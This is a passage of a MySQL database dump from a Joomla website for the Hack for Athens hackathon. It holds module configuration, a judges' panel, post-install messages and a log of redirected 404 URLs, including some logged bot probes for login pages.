00:00:00',1,'mod_roksprocket',1,0,'{\"provider\":\"joomla\",\"layout\":\"tabs\",\"joomla_articles\":{\"1\":{\"root\":{\"article\":\"44\"}},\"2\":{\"root\":{\"article\":\"40\"}},\"3\":{\"root\":{\"article\":\"41\"}},\"4\":{\"root\":{\"article\":\"47\"}}},\"joomla_sort\":\"manual\",\"joomla_sort_manual_append\":\"after\",\"mosaic_themes\":\"default\",\"lists_themes\":\"default\",\"tabs_themes\":\"default\",\"headlines_themes\":\"default\",\"strips_themes\":\"default\",\"display_limit\":\"\\u221e\",\"features_themes\":\"slideshow\",\"lists_enable_accordion\":\"1\",\"headlines_label_text\":\"\",\"tabs_position\":\"top\",\"features_show_title\":\"1\",\"lists_previews_length\":\"20\",\"strips_previews_length\":\"20\",\"headlines_previews_length\":\"20\",\"tabs_animation\":\"slideandfade\",\"lists_strip_html_tags\":\"1\",\"strips_strip_html_tags\":\"1\",\"features_show_article_text\":\"1\",\"headlines_show_arrows\":\"show\",\"tabs_autoplay\":\"0\",\"mosaic_columns\":\"3\",\"lists_items_per_page\":\"5\",\"strips_items_per_page\":\"4\",\"features_previews_length\":\"\\u221e\",\"features_strip_html_tags\":\"1\",\"features_show_arrows\":\"show\",\"headlines_animation\":\"slideandfade\",\"strips_items_per_row\":\"4\",\"strips_show_arrows\":\"show\",\"tabs_autoplay_delay\":\"5\",\"lists_show_arrows\":\"show\",\"mosaic_previews_length\":\"20\",\"mosaic_strip_html_tags\":\"1\",\"mosaic_items_per_page\":\"5\",\"strips_show_pagination\":\"1\",\"lists_show_pagination\":\"1\",\"features_show_pagination\":\"1\",\"headlines_autoplay\":\"0\",\"tabs_resize_enable\":\"0\",\"tabs_resize_width\":\"0\",\"tabs_resize_height\":\"0\",\"tabs_previews_length\":\"0\",\"lists_autoplay\":\"0\",\"headlines_autoplay_delay\":\"5\",\"mosaic_article_details\":\"0\",\"features_animation\":\"crossfade\",\"strips_animation\":\"fadeDelay\",\"mosaic_animations\":[\"fade\",\"scale\",\"rotate\"],\"strips_autoplay\":\"0\",\"lists_autoplay_delay\":\"5\",\"tabs_strip_html_tags\":\"0\",\"features_autoplay\":\"1\",\"headlines_resize_enable\":\"0\",\"headlines_resize_width\":\"0\",\"headlines_resize_height\":\"0\",\"mosaic_ordering\":[\"default\",\"title\",\"date\",\"random\"],\"strips_autoplay_delay\":\"5\",\"features_autoplay_delay\":\"5\",\"lists_resize_enable\":\"0\",\"lists_resize_width\":\"0\",\"lists_resize_height\":\"0\",\"strips_resize_enable\":\"0\",\"strips_resize_width\":\"0\",\"strips_resize_height\":\"0\",\"features_resize_enable\":\"0\",\"features_resize_width\":\"0\",\"features_resize_height\":\"0\",\"features_title_default\":\"title\",\"tabs_title_default\":\"title\",\"headlines_description_default\":\"primary\",\"strips_title_default\":\"title\",\"headlines_image_default\":\"primary\",\"lists_title_default\":\"title\",\"lists_description_default\":\"primary\",\"headlines_image_default_custom\":\"\",\"tabs_icon_default\":\"primary\",\"lists_image_default\":\"primary\",\"features_description_default\":\"primary\",\"strips_image_default\":\"primary\",\"strips_description_default\":\"primary\",\"tabs_icon_default_custom\":\"\",\"features_image_default\":\"primary\",\"headlines_link_default\":\"primary\",\"lists_image_default_custom\":\"\",\"strips_image_default_custom\":\"\",\"strips_link_default\":\"primary\",\"headlines_link_default_custom\":\"\",\"lists_link_default\":\"primary\",\"tabs_link_default\":\"primary\",\"features_image_default_custom\":\"\",\"strips_link_default_custom\":\"\",\"tabs_link_default_custom\":\"\",\"features_link_default\":\"primary\",\"lists_link_default_custom\":\"\",\"features_link_default_custom\":\"\",\"mosaic_resize_enable\":\"0\",\"mosaic_resize_width\":\"0\",\"mosaic_resize_height\":\"0\",\"mosaic_title_default\":\"title\",\"mosaic_description_default\":\"primary\",\"tabs_description_default\":\"primary\",\"mosaic_image_default\":\"primary\",\"mosaic_image_default_custom\":\"\",\"mosaic_link_default\":\"primary\",\"mosaic_link_default_custom\":\"\",\"cache\":\"0\",\"moduleclass_sfx\":\" mainpagemodule\",\"module_cache\":\"1\",\"cache_time\":\"900\"}',0,'*'),(232,0,'Sponsors, Partners, and Friends','','<p style=\"display:block;\"><img style=\"width:100%;\" src=\"images/sponsors.png\" alt=\"sponsors\" /></p>',1,'content-bottom-a',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',0,'mod_custom',1,0,'{\"prepare_content\":\"1\",\"backgroundimage\":\"\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}',0,'*'),(233,0,'The Judges','','<div style=\"text-align:center;\">\r\n<div class=\"profile-card vcard\" style=\"clear: both;\">\r\n<div class=\"profile-picture\" style=\"display:inline-table; margin: 1em 1em 0 1em; border: 1px solid #CCC; padding: 5px;\"><img src=\"http://m.c.lnkd.licdn.com/mpr/mpr/shrink_200_200/p/3/000/01f/264/039ff84.jpg\" alt=\"Margaret Wagner Dahl\" width=\"200\" height=\"200\" /></div>\r\n<div class=\"profile-overview\" style=\"clear: both;\">\r\n<div class=\"profile-overview-content\">\r\n<div id=\"member-42736770\" class=\"masthead\">\r\n<div data-li-template=\"p2_basic_info\">\r\n<div id=\"name-container\" data-li-template=\"name\">\r\n<div id=\"name\" class=\"editable-item\">\r\n<h2 style=\"margin-bottom: 0px; font-size: 20px;\"><span class=\"n fn\"><span class=\"full-name\"><a href=\"www.linkedin.com/pub/margaret-wagner-dahl/12/38b/b16/\" target=\"_blank\">Margaret Wagner Dahl</a></span><span>&nbsp;</span></span></h2>\r\n</div>\r\n</div>\r\n<div id=\"headline-container\" data-li-template=\"headline\">\r\n<div id=\"headline\" class=\"editable-item\">\r\n<p class=\"title \" style=\"font-size: 14px; margin: 0px; padding: 0px;\">Director of Business and Economic Development at University of Georgia</p>\r\n</div>\r\n</div>\r\n</div>\r\n</div>\r\n</div>\r\n</div>\r\n</div>\r\n\r\n<div class=\"profile-card vcard\" style=\"clear: both;\">\r\n<div class=\"profile-picture\" style=\"display:inline-table; margin: 1em 1em 0 1em; border: 1px solid #CCC; padding: 5px;\"><img src=\"http://m.c.lnkd.licdn.com/mpr/mpr/shrink_200_200/p/3/000/200/2a4/01e82c6.jpg\" alt=\"Bob Pinckney\" width=\"200\" height=\"200\" /></div>\r\n<div class=\"profile-overview\" style=\"clear: both;\">\r\n<div class=\"profile-overview-content\">\r\n<div id=\"member-42736770\" class=\"masthead\">\r\n<div data-li-template=\"p2_basic_info\">\r\n<div id=\"name-container\" data-li-template=\"name\">\r\n<div id=\"name\" class=\"editable-item\">\r\n<h2 style=\"margin-bottom: 0px; font-size: 20px;\"><span class=\"n fn\"><span class=\"full-name\"><a href=\"www.linkedin.com/pub/bob-pinckney/7/9a6/744/\" target=\"_blank\">Bob Pinckney</a></span><span>&nbsp;</span></span></h2>\r\n</div>\r\n</div>\r\n<div id=\"headline-container\" data-li-template=\"headline\">\r\n<div id=\"headline\" class=\"editable-item\">\r\n<p class=\"title \" style=\"font-size: 14px; margin: 0px; padding: 0px;\">CEO - EvoShield, LLC</p>\r\n</div>\r\n</div>\r\n</div>\r\n</div>\r\n</div>\r\n</div>\r\n</div>\r\n\r\n<div class=\"profile-card vcard\" style=\"clear: both;\">\r\n<div class=\"profile-picture\" style=\"display:inline-table; margin: 1em 1em 0 1em; border: 1px solid #CCC; padding: 5px;\"><img src=\"http://m.c.lnkd.licdn.com/mpr/mpr/shrink_200_200/p/8/000/1b3/080/01b2831.jpg\" alt=\"Bob Pinckney\" width=\"200\" height=\"200\" /></div>\r\n<div class=\"profile-overview\" style=\"clear: both;\">\r\n<div class=\"profile-overview-content\">\r\n<div id=\"member-42736770\" class=\"masthead\">\r\n<div data-li-template=\"p2_basic_info\">\r\n<div id=\"name-container\" data-li-template=\"name\">\r\n<div id=\"name\" class=\"editable-item\">\r\n<h2 style=\"margin-bottom: 0px; font-size: 20px;\"><span class=\"n fn\"><span class=\"full-name\"><a href=\"www.linkedin.com/pub/tom-robertson/18/632/6a5/\" target=\"_blank\">Tom Robertson</a></span><span>&nbsp;</span></span></h2>\r\n</div>\r\n</div>\r\n<div id=\"headline-container\" data-li-template=\"headline\">\r\n<div id=\"headline\" class=\"editable-item\">\r\n<p class=\"title \" style=\"font-size: 14px; margin: 0px; padding: 0px;\">CEO - IS3D, LLC</p>\r\n</div>\r\n</div>\r\n</div>\r\n</div>\r\n</div>\r\n</div>\r\n</div>\r\n\r\n</div>',1,'sidebar-a',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_custom',1,1,'{\"prepare_content\":\"1\",\"backgroundimage\":\"\",\"layout\":\"_:default\",\"moduleclass_sfx\":\" box1 title2 icon-info-sign\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}',0,'*'),(235,0,'Kunena Statistics','','',0,'',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',0,'mod_kunenastats',1,1,'',0,'*'),(236,0,'Kunena Latest','','',0,'',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',0,'mod_kunenalatest',1,1,'',0,'*'),(237,0,'Kunena Search','','',0,'',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',0,'mod_kunenasearch',1,1,'',0,'*'),(244,122,'B2J Contact','','',0,'',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',0,'mod_b2jcontact',1,1,'',0,'*');
/*!40000 ALTER TABLE `hfa_modules` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_modules_menu`
--

DROP TABLE IF EXISTS `hfa_modules_menu`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_modules_menu` (
  `moduleid` int(11) NOT NULL DEFAULT '0',
  `menuid` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`moduleid`,`menuid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_modules_menu`
--

LOCK TABLES `hfa_modules_menu` WRITE;
/*!40000 ALTER TABLE `hfa_modules_menu` DISABLE KEYS */;
INSERT INTO `hfa_modules_menu` VALUES (2,0),(3,0),(4,0),(6,0),(7,0),(8,0),(9,0),(10,0),(12,0),(13,0),(14,0),(15,0),(79,0),(86,0),(166,101),(167,101),(169,101),(173,0),(176,0),(177,0),(179,124),(182,101),(201,166),(202,0),(209,185),(210,173),(211,186),(216,196),(216,198),(216,199),(216,201),(217,174),(218,0),(223,173),(230,0),(231,101),(232,101),(233,201);
/*!40000 ALTER TABLE `hfa_modules_menu` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_newsfeeds`
--

DROP TABLE IF EXISTS `hfa_newsfeeds`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_newsfeeds` (
  `catid` int(11) NOT NULL DEFAULT '0',
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `link` varchar(200) NOT NULL DEFAULT '',
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `numarticles` int(10) unsigned NOT NULL DEFAULT '1',
  `cache_time` int(10) unsigned NOT NULL DEFAULT '3600',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `rtl` tinyint(4) NOT NULL DEFAULT '0',
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `language` char(7) NOT NULL DEFAULT '',
  `params` text NOT NULL,
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `metadata` text NOT NULL,
  `xreference` varchar(50) NOT NULL COMMENT 'A reference to enable linkages to external data sets.',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `description` text NOT NULL,
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  `images` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_state` (`published`),
  KEY `idx_catid` (`catid`),
  KEY `idx_createdby` (`created_by`),
  KEY `idx_language` (`language`),
  KEY `idx_xreference` (`xreference`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_newsfeeds`
--

LOCK TABLES `hfa_newsfeeds` WRITE;
/*!40000 ALTER TABLE `hfa_newsfeeds` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_newsfeeds` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_overrider`
--

DROP TABLE IF EXISTS `hfa_overrider`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_overrider` (
  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT 'Primary Key',
  `constant` varchar(255) NOT NULL,
  `string` text NOT NULL,
  `file` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_overrider`
--

LOCK TABLES `hfa_overrider` WRITE;
/*!40000 ALTER TABLE `hfa_overrider` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_overrider` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_postinstall_messages`
--

DROP TABLE IF EXISTS `hfa_postinstall_messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_postinstall_messages` (
  `postinstall_message_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `extension_id` bigint(20) NOT NULL DEFAULT '700' COMMENT 'FK to #__extensions',
  `title_key` varchar(255) NOT NULL DEFAULT '' COMMENT 'Lang key for the title',
  `description_key` varchar(255) NOT NULL DEFAULT '' COMMENT 'Lang key for description',
  `action_key` varchar(255) NOT NULL DEFAULT '',
  `language_extension` varchar(255) NOT NULL DEFAULT 'com_postinstall' COMMENT 'Extension holding lang keys',
  `language_client_id` tinyint(3) NOT NULL DEFAULT '1',
  `type` varchar(10) NOT NULL DEFAULT 'link' COMMENT 'Message type - message, link, action',
  `action_file` varchar(255) DEFAULT '' COMMENT 'RAD URI to the PHP file containing action method',
  `action` varchar(255) DEFAULT '' COMMENT 'Action method name or URL',
  `condition_file` varchar(255) DEFAULT NULL COMMENT 'RAD URI to file holding display condition method',
  `condition_method` varchar(255) DEFAULT NULL COMMENT 'Display condition method, must return boolean',
  `version_introduced` varchar(50) NOT NULL DEFAULT '3.2.0' COMMENT 'Version when this message was introduced',
  `enabled` tinyint(3) NOT NULL DEFAULT '1',
  PRIMARY KEY (`postinstall_message_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_postinstall_messages`
--

LOCK TABLES `hfa_postinstall_messages` WRITE;
/*!40000 ALTER TABLE `hfa_postinstall_messages` DISABLE KEYS */;
INSERT INTO `hfa_postinstall_messages` VALUES (1,700,'PLG_TWOFACTORAUTH_TOTP_POSTINSTALL_TITLE','PLG_TWOFACTORAUTH_TOTP_POSTINSTALL_BODY','PLG_TWOFACTORAUTH_TOTP_POSTINSTALL_ACTION','plg_twofactorauth_totp',1,'action','site://plugins/twofactorauth/totp/postinstall/actions.php','twofactorauth_postinstall_action','site://plugins/twofactorauth/totp/postinstall/actions.php','twofactorauth_postinstall_condition','3.2.0',0),(2,700,'COM_CPANEL_MSG_EACCELERATOR_TITLE','COM_CPANEL_MSG_EACCELERATOR_BODY','COM_CPANEL_MSG_EACCELERATOR_BUTTON','com_cpanel',1,'action','admin://components/com_admin/postinstall/eaccelerator.php','admin_postinstall_eaccelerator_action','admin://components/com_admin/postinstall/eaccelerator.php','admin_postinstall_eaccelerator_condition','3.2.0',1),(3,700,'COM_CPANEL_MSG_PHPVERSION_TITLE','COM_CPANEL_MSG_PHPVERSION_BODY','','com_cpanel',1,'message','','','admin://components/com_admin/postinstall/phpversion.php','admin_postinstall_phpversion_condition','3.2.2',1);
/*!40000 ALTER TABLE `hfa_postinstall_messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_redirect_links`
--

DROP TABLE IF EXISTS `hfa_redirect_links`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_redirect_links` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `old_url` varchar(255) NOT NULL,
  `new_url` varchar(255) NOT NULL,
  `referer` varchar(150) NOT NULL,
  `comment` varchar(255) NOT NULL,
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  `published` tinyint(4) NOT NULL,
  `created_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_link_old` (`old_url`),
  KEY `idx_link_modifed` (`modified_date`)
) ENGINE=InnoDB AUTO_INCREMENT=683 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_redirect_links`
--

LOCK TABLES `hfa_redirect_links` WRITE;
/*!40000 ALTER TABLE `hfa_redirect_links` DISABLE KEYS */;
INSERT INTO `hfa_redirect_links` VALUES (1,'http://hackforathens.org/component/content/?id=6&Itemid=113','','','',129,0,'2013-04-06 06:32:10','0000-00-00 00:00:00'),(2,'http://hackforathens.org/component/content/?id=5&Itemid=112','','','',145,0,'2013-04-06 06:33:00','0000-00-00 00:00:00'),(3,'http://hackforathens.org/component/content/?id=10&Itemid=117','','','',147,0,'2013-04-06 06:40:43','0000-00-00 00:00:00'),(4,'http://www.hackforathens.org/component/content/?id=5&Itemid=112','','','',69,0,'2013-04-06 10:16:12','0000-00-00 00:00:00'),(5,'http://www.hackforathens.org/component/content/?id=10&Itemid=117','','','',67,0,'2013-04-06 10:18:36','0000-00-00 00:00:00'),(6,'http://www.hackforathens.org/component/content/?id=6&Itemid=113','','','',73,0,'2013-04-06 10:22:38','0000-00-00 00:00:00'),(7,'http://HACKFORATHENS.ORG/wp-admin/','','','',9,0,'2013-04-08 00:48:04','0000-00-00 00:00:00'),(8,'http://hackforathens.org/wordpress/wp-admin/','','','',6,0,'2013-04-09 11:33:59','0000-00-00 00:00:00'),(9,'http://hackforathens.org/blog/wp-admin/','','','',6,0,'2013-04-09 11:34:00','0000-00-00 00:00:00'),(10,'http://www.hackforathens.org/index.php/component/content/?id=10&Itemid=117','','','',4,0,'2013-04-17 05:05:39','0000-00-00 00:00:00'),(11,'http://www.hackforathens.org/index.php/component/content/?id=5&Itemid=112','','','',4,0,'2013-04-17 05:05:41','0000-00-00 00:00:00'),(12,'http://www.hackforathens.org/index.php/component/content/?id=6&Itemid=113','','','',5,0,'2013-04-17 05:05:42','0000-00-00 00:00:00'),(13,'http://www.hackforathens.org/login','','','',1,0,'2013-04-17 05:06:14','0000-00-00 00:00:00'),(14,'http://hackforathens.org/index.php/component/content/?id=5&Itemid=112','','','',6,0,'2013-04-18 06:27:32','0000-00-00 00:00:00'),(15,'http://hackforathens.org/login','','','',2,0,'2013-04-18 06:27:33','0000-00-00 00:00:00'),(16,'http://hackforathens.org/index.php/component/content/?id=10&Itemid=117','','','',7,0,'2013-04-18 06:41:30','0000-00-00 00:00:00'),(17,'http://hackforathens.org/index.php/component/content/?id=6&Itemid=113','','','',8,0,'2013-04-18 06:42:43','0000-00-00 00:00:00'),(18,'http://hackforathens.org/JQEASY_JQLIB','','http://hackforathens.org/login','',1,0,'2013-04-20 17:45:41','0000-00-00 00:00:00'),(19,'http://hackforathens.org/JQEASY_JQNOCONFLICT','','http://hackforathens.org/login','',1,0,'2013-04-20 17:45:41','0000-00-00 00:00:00'),(20,'http://hackforathens.org/forum','','http://hackforathens.org/','',17,0,'2013-04-22 11:18:16','0000-00-00 00:00:00'),(21,'http://www.hackforathens.org/forum','','http://www.hackforathens.org/','',10,0,'2013-04-22 14:24:45','0000-00-00 00:00:00'),(22,'http://hackforathens.org/forum/main-forum','','','',6,0,'2013-04-23 00:19:05','0000-00-00 00:00:00'),(23,'http://hackforathens.org/index.php/forum/index','','','',23,0,'2013-04-23 05:06:01','0000-00-00 00:00:00'),(24,'http://hackforathens.org/index.php/forum','','','',14,0,'2013-04-23 05:41:37','0000-00-00 00:00:00'),(25,'http://hackforathens.org/datasets','','','',26,0,'2013-04-24 00:33:17','0000-00-00 00:00:00'),(26,'http://hackforathens.org/challenges','','','',26,0,'2013-04-24 02:46:18','0000-00-00 00:00:00'),(27,'http://hackforathens.org/event/discussion','','','',5,0,'2013-04-24 03:50:03','0000-00-00 00:00:00'),(28,'http://www.hackforathens.org/index.php/forum/index','','','',16,0,'2013-04-24 07:08:23','0000-00-00 00:00:00'),(29,'http://hackforathens.org/index.php/forum/general-information/1-welcome-to-the-hackforathens-forum','','','',4,0,'2013-04-24 08:15:05','0000-00-00 00:00:00'),(30,'http://hackforathens.org/index.php/challenges','','','',9,0,'2013-04-24 11:35:28','0000-00-00 00:00:00'),(31,'http://hackforathens.org/event/schedule','','','',10,0,'2013-04-24 13:16:43','0000-00-00 00:00:00'),(32,'http://hackforathens.org/index.php/kunena/recent-topics','','','',8,0,'2013-04-24 14:01:12','0000-00-00 00:00:00'),(33,'http://www.hackforathens.org/index.php/forum','','','',3,0,'2013-04-24 14:14:45','0000-00-00 00:00:00'),(34,'http://hackforathens.org/index.php/datasets','','','',6,0,'2013-04-24 14:43:40','0000-00-00 00:00:00'),(35,'http://hackforathens.org/index.php/kunena/main-forum','','','',8,0,'2013-04-24 15:16:31','0000-00-00 00:00:00'),(36,'http://hackforathens.org/forum/general-information','','http://www.google.com/url?sa=t&rct=j&q=%22kstorm%22%20athens%2C%20ga&source=web&cd=1&cad=rja&ved=0CDAQFjAA&url=http%3A%2F%2Fhackforathens.org%2Fforum%','',4,0,'2013-04-24 17:37:30','0000-00-00 00:00:00'),(37,'http://hackforathens.org/forum/statistics','','http://www.google.com/url?sa=t&rct=j&q=%22kstorm%22%20athens%2C%20ga&source=web&cd=3&cad=rja&ved=0CDoQFjAC&url=http%3A%2F%2Fhackforathens.org%2Fforum%','',6,0,'2013-04-24 17:37:54','0000-00-00 00:00:00'),(38,'http://hackforathens.org/event/teams/create-team','','','',8,0,'2013-04-24 20:07:16','0000-00-00 00:00:00'),(39,'http://hackforathens.org/event/discussion/index','','','',5,0,'2013-04-25 00:24:12','0000-00-00 00:00:00'),(40,'http://www.hackforathens.org/challenges','','http://www.hackforathens.org/','',10,0,'2013-04-25 03:19:24','0000-00-00 00:00:00'),(41,'http://hackforathens.org/event/discussion/recent','','','',7,0,'2013-04-25 05:58:42','0000-00-00 00:00:00'),(42,'http://hackforathens.org/index.php/kunena/categories','','','',12,0,'2013-04-25 13:33:09','0000-00-00 00:00:00'),(43,'http://hackforathens.org/forum/general-information/1-welcome-to-the-hackforathens-forum','','','',6,0,'2013-04-25 14:32:46','0000-00-00 00:00:00'),(44,'http://hackforathens.org/submit-challenges','','','',4,0,'2013-04-26 05:02:47','0000-00-00 00:00:00'),(45,'http://hackforathens.org/event/discussion/search','','','',4,0,'2013-04-26 08:30:45','0000-00-00 00:00:00'),(46,'http://hackforathens.org/forum/recent','','','',3,0,'2013-04-26 08:53:46','0000-00-00 00:00:00'),(47,'http://hackforathens.org/forum/index','','','',95,0,'2013-04-26 20:13:33','0000-00-00 00:00:00'),(48,'http://www.hackforathens.org/datasets','','','',7,0,'2013-04-26 20:19:47','0000-00-00 00:00:00'),(49,'http://hackforathens.org/forum/search','','','',3,0,'2013-04-26 20:56:05','0000-00-00 00:00:00'),(50,'http://hackforathens.org/index.php/forum/search','','','',2,0,'2013-04-27 00:40:57','0000-00-00 00:00:00'),(51,'http://www.hackforathens.org/index.php/forum/faq','','','',2,0,'2013-04-27 04:07:29','0000-00-00 00:00:00'),(52,'http://hackforathens.org/index.php/forum/general-information','','','',2,0,'2013-04-27 10:05:46','0000-00-00 00:00:00'),(53,'http://hackforathens.org/index.php/forum/statistics','','','',2,0,'2013-04-27 10:38:20','0000-00-00 00:00:00'),(54,'http://hackforathens.org/index.php/forum/faq','','','',2,0,'2013-04-27 11:10:54','0000-00-00 00:00:00'),(55,'http://hackforathens.org/index.php/forum/main-forum','','','',2,0,'2013-04-27 11:43:28','0000-00-00 00:00:00'),(56,'http://www.hackforathens.org/index.php/kunena/categories','','','',3,0,'2013-04-27 11:51:19','0000-00-00 00:00:00'),(57,'http://hackforathens.org/index.php/forum/suggestion-box','','','',2,0,'2013-04-27 16:04:02','0000-00-00 00:00:00'),(58,'http://hackforathens.org/index.php/forum/recent','','','',2,0,'2013-04-27 16:36:36','0000-00-00 00:00:00'),(59,'http://hackforathens.org/submit-datasets','','','',4,0,'2013-04-27 22:02:18','0000-00-00 00:00:00'),(60,'http://hackforathens.org/forum/suggestion-box','','','',5,0,'2013-04-28 19:38:03','0000-00-00 00:00:00'),(61,'http://hackforathens.org/index.php/kunena/','','','',1,0,'2013-04-28 20:31:38','0000-00-00 00:00:00'),(62,'http://www.hackforathens.org/forum/general-information/1-welcome-to-the-hackforathens-forum','','','',1,0,'2013-04-29 14:35:55','0000-00-00 00:00:00'),(63,'http://www.hackforathens.org/forum/main-forum','','','',2,0,'2013-04-29 14:36:09','0000-00-00 00:00:00'),(64,'http://www.hackforathens.org/index.php/challenges','','','',4,0,'2013-04-29 17:41:51','0000-00-00 00:00:00'),(65,'http://www.hackforathens.org/forum/general-information','','','',5,0,'2013-04-30 21:23:19','0000-00-00 00:00:00'),(66,'http://www.hackforathens.org/forum/search','','','',1,0,'2013-04-30 21:53:21','0000-00-00 00:00:00'),(67,'http://www.hackforathens.org/forum/suggestion-box','','','',1,0,'2013-04-30 21:53:23','0000-00-00 00:00:00'),(68,'http://hackforathens.org/user','','','',1,0,'2013-05-01 00:33:39','0000-00-00 00:00:00'),(69,'http://hackforathens.org/admin.php','','','',10,0,'2013-05-01 13:03:53','0000-00-00 00:00:00'),(70,'http://hackforathens/forum','','http://hackforathens/','',5,0,'2013-05-02 20:25:10','0000-00-00 00:00:00'),(71,'http://hackforathens/challenges','','http://hackforathens/','',1,0,'2013-05-02 20:27:04','0000-00-00 00:00:00'),(72,'http://hackforathens.org/wp-login.php','','','',24,0,'2013-05-03 02:10:40','0000-00-00 00:00:00'),(73,'http://hackforathens.org/wp-login.php?action=register','','','',1,0,'2013-05-03 12:17:48','0000-00-00 00:00:00'),(74,'http://www.hackforathens.org/index.php/forum/main-forum','','','',2,0,'2013-05-04 08:41:37','0000-00-00 00:00:00'),(75,'http://www.hackforathens.org/index.php/forum/general-information','','','',2,0,'2013-05-04 08:41:46','0000-00-00 00:00:00'),(76,'http://www.hackforathens.org/index.php/forum/statistics','','','',2,0,'2013-05-04 08:55:21','0000-00-00 00:00:00'),(77,'http://www.hackforathens.org/index.php/forum/suggestion-box','','','',2,0,'2013-05-04 09:05:06','0000-00-00 00:00:00'),(78,'http://hackforathens.org/event/discussion/general-information/1-welcome-to-the-hackforathens-forum','','','',3,0,'2013-05-04 18:44:36','0000-00-00 00:00:00'),(79,'http://www.hackforathens.org/forum/statistics','','','',93,0,'2013-05-05 22:35:35','0000-00-00 00:00:00'),(80,'http://www.hackforathens.org/forum/recent','','','',4,0,'2013-05-07 01:11:44','0000-00-00 00:00:00'),(81,'http://hackforathens.org/forum/faq','','','',2,0,'2013-05-07 05:46:47','0000-00-00 00:00:00'),(82,'http://www.hackforathens.org/forum/index','','','',2,0,'2013-05-07 08:16:55','0000-00-00 00:00:00'),(83,'http://hackforathens.org/signup','','','',30,0,'2013-05-07 12:08:06','0000-00-00 00:00:00'),(84,'http://hackforathens.org/register\"','','http://hackforathens.org/','',5,0,'2013-05-07 12:08:11','0000-00-00 00:00:00'),(85,'http://hackforathens.org/tiki-register.php','','http://hackforathens.org/','',6,0,'2013-05-07 12:08:14','0000-00-00 00:00:00'),(86,'http://hackforathens.org/user/register','','http://hackforathens.org/','',7,0,'2013-05-07 12:08:18','0000-00-00 00:00:00'),(87,'http://hackforathens.org/sign_up.html','','http://hackforathens.org/','',7,0,'2013-05-07 12:08:19','0000-00-00 00:00:00'),(88,'http://hackforathens.org/signup/','','http://hackforathens.org/','',10,0,'2013-05-07 12:08:22','0000-00-00 00:00:00'),(89,'http://hackforathens.org/signup.php','','','',34,0,'2013-05-07 12:08:24','0000-00-00 00:00:00'),(90,'http://hackforathens.org/index.php?option=com_registration&task=register','','http://hackforathens.org/index.php?option=com_registration&task=register','',7,0,'2013-05-07 12:08:33','0000-00-00 00:00:00'),(91,'http://hackforathens.org/register.php','','http://hackforathens.org/register.php','',30,0,'2013-05-07 